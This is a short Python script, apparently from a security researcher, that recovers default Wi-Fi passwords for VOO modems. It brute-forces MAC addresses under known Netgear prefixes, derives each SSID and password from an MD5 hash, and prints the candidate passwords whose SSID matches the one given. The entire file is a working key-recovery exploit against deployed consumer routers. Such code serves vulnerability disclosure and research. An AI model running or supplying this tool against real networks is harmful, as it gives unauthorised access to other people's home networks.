#!/usr/bin/env python3
'''
Generate all potential PSK candidates given a default VOO modem SSID by using
that SSID as an oracle.

Author: Quentin Kaiser <kaiserquentin@gmail.com>
'''
import hashlib
import struct
import sys

# these are observed netgear MAC
NETGEAR_OUIS = [
    "0x100D7F",
    "0xA42B8C",
    "0x00146C",
    "0x001B2F",
    "0x001E2A",
    "0x001F33",
    "0x008EF2"
]

SSID_PREFIX = "VOO-"

def get_ssid(tmp_hash):
    return "VOO-{}".format(''.join([str(tmp_hash[j] % 10) for j in range(0, 6)]))

def get_psk(tmp_hash):
    return ''.join([chr((tmp_hash[k] % 0x1a) * 0x1000000 + 0x41000000 >> 0x18) for k in range(5, 13)])

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: {} SSID".format(sys.argv[0]))
        sys.exit(-1)

    ssid = sys.argv[1]
    for netgear_oui in NETGEAR_OUIS:
        for i in range(0, pow(16, 6)):
            tmp_mac = "{}{:06X}".format(netgear_oui, i)
            tmp_hash = bytearray(hashlib.md5(tmp_mac.encode('utf-8')).digest())
            if ssid == get_ssid(tmp_hash):
                print("[+] Potential candidate found (MAC: %s) - %s" % (tmp_mac, get_psk(tmp_hash)))
